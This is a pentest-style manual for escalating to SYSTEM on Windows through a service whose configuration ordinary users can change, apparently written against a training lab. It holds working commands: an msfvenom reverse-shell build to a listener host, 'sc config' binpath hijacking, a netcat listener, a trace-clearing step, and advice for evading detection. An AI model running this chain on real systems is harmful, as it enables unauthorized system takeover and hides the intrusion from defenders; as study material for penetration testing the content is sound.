# Manual

## 01 - Detect

Poorly configurations of some services that allows users to alter or overwrite the executable binary path that leads to full privileges. We use the the Windows builtin command line tool `sc.exe` that is called SCM (Service Control Manager) to manage the services.

### 1.1 - Command Prompt

```
C:\> net user %username%
User name                    user
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/5/2020 7:32:00 AM
Password expires             Never
Password changeable          6/5/2020 7:32:00 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 5:09:49 PM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

First we enumerate to discover the `LocalSystem`.

```
C:\> wmic service get name,pathname,startname,startmode | findstr /i "localsystem" | findstr /i "c:\program files"
Name                                      PathName                                                                           StartMode  StartName
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                 Auto       LocalSystem
AWSLiteAgent                              C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       LocalSystem
daclsvc                                   "C:\Program Files\DACL Service\daclservice.exe"                                    Manual     LocalSystem
dllsvc                                    "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                         Manual     LocalSystem
filepermsvc                               "C:\Program Files\File Permissions Service\filepermservice.exe"                    Manual     LocalSystem
regsvc                                    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"           Manual     LocalSystem
Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"         Manual     LocalSystem
unquotedsvc                               C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe        Manual     LocalSystem
WinDefend                                 "C:\Program Files\Windows Defender\MsMpEng.exe"                                    Manual     LocalSystem

C:\> wmic service list brief
ExitCode  Name                                      ProcessId  StartMode  State    Status
..[snip]..
0         CryptSvc                                  1308       Auto       Running
1077      CscService                                0          Disabled   Stopped  OK       
1077      daclsvc                                   0          Manual     Stopped  OK       
0         DcomLaunch                                852        Auto       Running  OK       
1077      defragsvc                                 0          Manual     Stopped  OK       
..[snip]..
```

We find the service name called `daclsvc` let's query it to see what privileges it has. We'll be running with a command `sc.exe` which is called SCM (Service Control Management) that it comes builtin in the Windows operating system.

This is the following syntax we're gonna use to enumerate:

`C:\> sc qc <servicesvc>`

```
C:\> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

We can see the `SERVICE_START_NAME` runs with **SYSTEM** privileges that has `LocalSystem`. To verify even further we have two other methods to enumerate it in order to confirm that we can elevate it to higher level of privileges.

- **`icacls.exe` to view the ACL (Access Control Lists)**

```
C:\> icacls "C:\Program Files\DACL Service\daclservice.exe"
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Note that the `BUILTIN\Users:(I)(RX)` meant that it is configured into that can read and executable to users so in other words we can use the `sc.exe` command to start, stop and configure binary of the service. What you should look out for is `BUILTIN\Users:(I)(F)` that has granted the users full access so we can modify in that specific path or `BUILTIN\Users:(I)(RX)` should be enough so we can change the binary path to execute our malware.

- **Using `accesschk.exe` sysinternals tool**

This is following syntax when executing the sysinternal binary:

`C:\> accesschk.exe /accepteula -uwcqv <username> <servicesvc>`

```
C:\> accesschk.exe /accepteula -uwcqv %username% daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

When using a user account with least privileges let's say for example `user` that has a permission to modify the service configuration **SERVICE_CHANGE_CONFIG**. That indicates to all the last three methods we've tested that we can elevate it with **SYSTEM** privileges. This is just for you to understand how you can tell to exploit the misconfigured Windows service name that anything ends with the three letters **svc**.

### 1.2 - Powershell

First we enumerate to discover the `LocalSystem`.

`PS C:\> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

This is the following syntax we're gonna use to enumerate:

`PS C:\> get-service <servicesvc> | format-list`

```
PS C:\> get-service daclsvc | format-list
get-service daclsvc | format-list


Name                : daclsvc
DisplayName         : DACL Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

To verify even further we have one method to enumerate it in order to confirm that we can elevate it to higher level of privileges.

```
PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | format-list


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\DACL Service\daclservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0
         x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
```

Notice on the powershell cmdlet gave us with this particular line `BUILTIN\Users Allow ReadAndExecute, Synchronize` the word **"Allow"** and **"ReadAndExecute"** indicates that the users can configure it path of the service in anyway they want.

We can display more information to combine `Get-ACL` with `ConvertFrom-SddlString`

```
PS C:\> $acl = get-acl -path "C:\Program Files\DACL Service\daclservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

We can shorten it into this.

`PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | fl AccessToString`

Looks like powershell has a better way to give more information of what we can do with it.

## 02 - Exploit

From the enumeration phase we know this is a manual service start mode. So we have to enable it manually to receive a reverse shell connection since we have permission to do so. This is what the syntax looks like to modify the configuration to our reverse shell.

`C:\> sc config <servicesvc> binpath="<path_to_shell>"`

Generate a stageless reverse shell via `msfvenom` tool and then use any of the **file transfer techniques** then let's copy our reverse shell in the `C:\Temp` folder. Why stageless? The reason is if we use staged payloads it will stop the payload right away before it finishes which is why stageless payloads is a suitable job for this vector attack.

`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=53 -f exe -o shell.exe`

- In command prompt

```
C:\> copy shell.exe c:\temp\

C:\> sc config daclsvc binpath="\"c:\temp\shell.exe"
```

- In powershell

```
PS C:\> copy-item shell.exe -destination c:\temp\

PS C:\> Set-Service -Name daclsvc -DisplayName "DACL Service"
```

And start the reverse shell handler with netcat

`$ sudo nc -lnvp 53`

Then execute the service manually

- In command prompt

```
C:\> net start daclsvc

C:\> sc start daclsvc
```

- In powershell

`PS C:\> Start-Service daclsvc`

We have elevated to `NT AUTHORITY\SYSTEM`

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.145.32.
Ncat: Connection from 10.10.145.32:49859.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## 03 - Cleanup

Now let's revert back the original configuration to clear our trace ahead of time.

`C:\Windows\system32> sc config daclsvc binpath="\"C:\Program Files\DACL Service\daclservice.exe"`

Now for my final thoughts. Realistically not all services are set to manual. Something like this output error:

```
C:\> sc stop vulnerablesvc
System error 5 has occured.

Access is denied
```

When escalating to **SYSTEM** privileges you may not have the privileges to `start` or `stop` the service via `sc.exe` or `net.exe` so instead find the services that does contain **Auto** start mode instead of **Manual** when enumerating with `wmic` from the very first start of [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Windows/Host/Processes AND Services AND Software/Windows Services/Manual|Enumeration and Discovery]] phase.

And you should have the privilege to shutdown/reboot the Windows workstation it's impossible not to have that. To confirm this `whoami /priv` command:

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

After you have configured the the `binpath` for your reverse shell connection. Run this command to reboot the system:

`C:\> shutdown /r /t 0`

One last thing is that you don't need to use `accesschk.exe` because cybersecurity firms has now made it possible to detect the legitimate sysinternals suite toolkit that was made by microsoft. The developer had to include the `/accepteula` flag that will pop an event viewer alert ID but it's not always the case if the administrators are using it. This is why I've showed you a few ways to enumerate to break down step by step to further confirm that it is indeed exploitable. Use the other two previous methods other than the `accesschk.exe`.

---
## References

- [Windows Privilege Escalation Weak Services Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/)

- [Abuse Service Registry ACLs Windows Privesc](https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509)

- [Insecure Service Permissions](https://www.adamcouch.co.uk/insecure-service-permissions/)